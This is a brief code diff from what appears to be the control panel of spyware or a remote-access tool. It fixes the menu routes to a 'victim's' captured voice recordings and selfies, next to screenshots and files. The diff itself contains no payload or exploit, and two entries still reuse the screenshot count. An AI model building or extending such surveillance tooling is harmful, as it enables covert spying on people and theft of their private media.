@@ -86,8 +86,8 @@
                     //TODO: Build media viewer.
                     new MenuItem(5, "Files", theVictim.getMediaFileCount(), "/client/victim/media/files/" + victimCode),
                     new MenuItem(6, "Screen Shots", theVictim.getMediaScreenShotCount(), "/client/victim/media/screen_shots/" + victimCode),
-                    new MenuItem(7, "Voices", theVictim.getMediaScreenShotCount(), "/client/victim/media/screen_shots/" + victimCode),
-                    new MenuItem(8, "Selfie", theVictim.getMediaScreenShotCount(), "/client/victim/media/screen_shots/" + victimCode),
+                    new MenuItem(7, "Voices", theVictim.getMediaScreenShotCount(), "/client/victim/media/voices/" + victimCode),
+                    new MenuItem(8, "Selfies", theVictim.getMediaScreenShotCount(), "/client/victim/media/selfies/" + victimCode),
             };
 
 
